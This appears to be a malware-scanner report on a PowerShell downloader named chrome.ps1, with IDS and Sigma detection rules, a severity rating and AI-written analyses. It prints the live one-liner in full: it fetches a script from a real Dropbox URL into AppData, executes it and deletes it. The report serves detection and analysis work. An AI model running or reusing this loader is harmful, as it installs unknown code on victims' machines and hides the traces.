crowdsourced_ids_results.rule_msg: ET INFO DropBox User Content Domain (dl .dropboxusercontent .com in TLS SNI)
crowdsourced_ids_results.rule_raw: alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO DropBox User Content Domain (dl .dropboxusercontent .com in TLS SNI)"; flow:established,to_server; tls.sni; content:"dl.dropboxusercontent.com"; bsize:25; fast_pattern; classtype:misc-activity; sid:2035593; rev:1; metadata:attack_target Client_Endpoint, created_at 2022_03_24, deployment Perimeter, performance_impact Low, confidence High, signature_severity Informational, updated_at 2022_03_24;)

threat_severity.level_description: Severity HIGH because it was considered downloader. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values:
@{ScriptBlockText=$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/nanwt6elsuxziz05hnlt4/cjfansgmlans1-x.txt?rlkey=l6gzro1rswkqbk6tinxnkuylv&st=iv78c1cg&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Path $aaa -Force;
; MessageTotal=1; ScriptBlockId=b493989b-7441-4c0f-b56e-64594950bc04; Path=C:\Users\Bruno\Desktop\chrome.ps1; EventID=4104; MessageNumber=1}

@{ScriptBlockText=$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/nanwt6elsuxziz05hnlt4/cjfansgmlans1-x.txt?rlkey=l6gzro1rswkqbk6tinxnkuylv&st=iv78c1cg&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Path $aaa -Force;
; Path=C:\Users\george\Desktop\chrome.ps1; ScriptBlockId=3ea2c953-6ba3-4d5c-a40f-808cb6247d45; MessageTotal=1; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_description: Detects potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Perez Diego (@darkquassar), Tuan Le (NCSGroup)

attributes.magic: Unicode text, UTF-8 (with BOM) text, with CRLF line terminators

crowdsourced_ai_results.analysis:
The provided PowerShell code performs several actions that indicate malicious intent. First, it constructs a file path in the user's AppData directory for a script named "temp.ps1". It then uses the `wget` command to download a file from a specified URL hosted on Dropbox. The downloaded file is saved to the previously defined path. After downloading, the script executes the downloaded file using the call operator (`&`). Finally, it removes the downloaded script file from the system.

Key points of concern include:
- The use of a temporary file in the AppData directory, which is often used by malware to hide its presence.
- Downloading and executing a script from an external source without user consent or knowledge, which is a common tactic employed by malicious actors to install malware or perform unauthorized actions on a system.
- The removal of the downloaded file immediately after execution suggests an attempt to cover tracks and avoid detection.

Overall, the behavior of this code aligns with typical patterns seen in malicious scripts designed to compromise systems.

The PowerShell script first constructs a file path by joining the user's AppData environment variable with "temp.ps1".  It then uses `wget` to download a file from a Dropbox URL to the constructed path.  The downloaded file ("temp.ps1") is subsequently executed using the call operator `&`. Finally, the script removes "temp.ps1" using `Remove-Item -Force`.
